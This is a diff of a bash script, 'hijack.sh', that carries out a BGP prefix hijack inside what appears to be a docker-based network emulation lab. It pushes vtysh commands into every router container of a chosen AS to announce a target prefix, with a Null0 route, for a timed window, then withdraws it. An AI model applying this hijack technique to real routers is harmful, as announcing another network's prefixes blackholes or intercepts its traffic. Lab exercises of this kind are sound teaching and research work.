@@ -1,13 +1,10 @@
 #!/bin/bash
 # Description: Hijack a BGP route
 
-while getopts 'a:r:p:t:' OPTION; do
+while getopts 'a:p:t:' OPTION; do
     case "$OPTION" in
         a)
             as_number="$OPTARG"
-            ;;
-        r)
-            router_name="$OPTARG"      
             ;;
         p)
             prefix="$OPTARG"
@@ -16,7 +13,7 @@ while getopts 'a:r:p:t:' OPTION; do
             duration="$OPTARG"
             ;;
         ?)
-            echo "script usage: ./hijack.sh [-a <AS number>] [-r <Router name>] [-p <Prefix to hijack>]" >&2
+            echo "script usage: ./hijack.sh [-a <AS number>] [-p <Prefix to hijack>] (-t <duration minutes>)" >&2
             exit 1
             ;;
     esac
@@ -34,11 +31,9 @@ elif [ "$duration" -lt 1 ]; then
     exit 1
 fi
 
-
-
-if [ -z "$as_number" ] || [ -z "$prefix" ] || [ -z "$router_name" ]; then
-    echo "script usage: ./hijack.sh [-a <AS number>] [-r <Router name>] [-p <Prefix to hijack>] (-t <duration minutes>)" >&2
-    echo "AS number, router name and prefix are required" >&2
+if [ -z "$as_number" ] || [ -z "$prefix" ]; then
+    echo "script usage: ./hijack.sh [-a <AS number>] [-p <Prefix to hijack>] (-t <duration minutes>)" >&2
+    echo "AS number and prefix are required" >&2
 
     exit 1
 fi
@@ -69,56 +64,85 @@ else
     exit 1
 fi
 
-# Check wether the router name is a valid router name or not
-if [[ ! $(docker ps -a --format '{{.Names}}' | grep "${as_number}_${router_name}router") ]]; then
-    echo "AS ${as_number} does not have a router named ${router_name}router"
-    echo "Please check the AS number and router name"
-    exit 1
-fi 
+# Hijack the prefix for each router of the as
+routers=($(docker ps --format '{{.Names}}' | grep "${as_number}" | grep router))
+for router in "${routers[@]}"; do
+    router_name=$(echo "$router" | cut -d'_' -f2)
+    echo "(AS${as_number})Hijacking ${prefix} for ${duration} minute(s) on ${router_name}router"
 
-# Check wether the router has the ability to hijack a prefix or not
-if [[ ! $(docker exec "${as_number}_${router_name}router" vtysh -c 'show interface brief' | grep "hijack          up") ]]; then
-    echo "Router ${router_name}router does not have the ability to hijack a prefix"
-    echo "Please check the router name"
-    exit 1
-fi
-
-# Hijack the prefix
-{
-    echo "#!/bin/bash"
-    echo "vtysh  -c 'conf t' \\"
-    echo " -c 'interface hijack' \\"
-    echo " -c 'ip address ${prefix}' \\"
-    echo " -c 'exit' \\"
-    echo " -c 'router bgp ${as_number}' \\"
-    echo " -c 'network ${prefix}' \\"
-    echo " -c 'exit' \\"
-    echo " -c 'exit' \\"
-} | docker exec -i "${as_number}_${router_name}router" bash
-
-echo "(AS${as_number})Hijacking ${prefix} for ${duration} minute(s)"
+    # Hijack the prefix
+    {
+        echo "#!/bin/bash"
+        echo "vtysh  -c 'conf t' \\"
+        echo " -c 'ip route ${prefix} Null0' \\"
+        echo " -c 'router bgp ${as_number}' \\"
+        echo " -c 'network ${prefix}' \\"
+        echo " -c 'exit' \\"
+        echo " -c 'exit' \\"
+    } | docker exec -i "${router}" bash
+done
 
 # Sleep for the duration of the hijack
 for (( i=duration; i>0; i-- )); do
     if [ "$i" -eq 1 ]; then
-        echo "(AS${as_number})1 minute remaining"
+        echo "(AS${as_number})1 minute Remaining"
     else
         echo "(AS${as_number})$((i)) minutes Remaining"
     fi
     sleep 1m
 done
 
-# Withdraw the prefix
-{
-    echo "#!/bin/bash"
-    echo "vtysh  -c 'conf t' \\"
-    echo " -c 'router bgp ${as_number}' \\"
-    echo " -c 'no network ${prefix}' \\"
-    echo " -c 'exit' \\"
-    echo " -c 'interface hijack' \\"
-    echo " -c 'no ip address ${prefix}' \\"
-    echo " -c 'exit' \\"
-    echo " -c 'exit' \\"
-} | docker exec -i "${as_number}_${router_name}router" bash
+for router in "${routers[@]}"; do
+    router_name=$(echo "$router" | cut -d'_' -f2)
+    echo "(AS${as_number})Withdrawing hijack for ${prefix} from ${router_name}router"
 
-echo "(AS${as_number})Prefix ${prefix} withdrawn"
+    # Withdraw the prefix
+    {
+        echo "#!/bin/bash"
+        echo "vtysh  -c 'conf t' \\"
+        echo " -c 'no ip route ${prefix} Null0' \\"
+        echo " -c 'router bgp ${as_number}' \\"
+        echo " -c 'no network ${prefix}' \\"
+        echo " -c 'exit' \\"
+        echo " -c 'exit' \\"
+    } | docker exec -i "${router}" bash
+done
+
+# {
+#     echo "#!/bin/bash"
+#     echo "vtysh  -c 'conf t' \\"
+#     echo " -c 'interface hijack' \\"
+#     echo " -c 'ip address ${prefix}' \\"
+#     echo " -c 'exit' \\"
+#     echo " -c 'router bgp ${as_number}' \\"
+#     echo " -c 'network ${prefix}' \\"
+#     echo " -c 'exit' \\"
+#     echo " -c 'exit' \\"
+# } | docker exec -i "${as_number}_${router_name}router" bash
+
+# echo "(AS${as_number})Hijacking ${prefix} for ${duration} minute(s)"
+
+# # Sleep for the duration of the hijack
+# for (( i=duration; i>0; i-- )); do
+#     if [ "$i" -eq 1 ]; then
+#         echo "(AS${as_number})1 minute remaining"
+#     else
+#         echo "(AS${as_number})$((i)) minutes Remaining"
+#     fi
+#     sleep 1m
+# done
+
+# # Withdraw the prefix
+# {
+#     echo "#!/bin/bash"
+#     echo "vtysh  -c 'conf t' \\"
+#     echo " -c 'router bgp ${as_number}' \\"
+#     echo " -c 'no network ${prefix}' \\"
+#     echo " -c 'exit' \\"
+#     echo " -c 'interface hijack' \\"
+#     echo " -c 'no ip address ${prefix}' \\"
+#     echo " -c 'exit' \\"
+#     echo " -c 'exit' \\"
+# } | docker exec -i "${as_number}_${router_name}router" bash
+
+# echo "(AS${as_number})Prefix ${prefix} withdrawn"
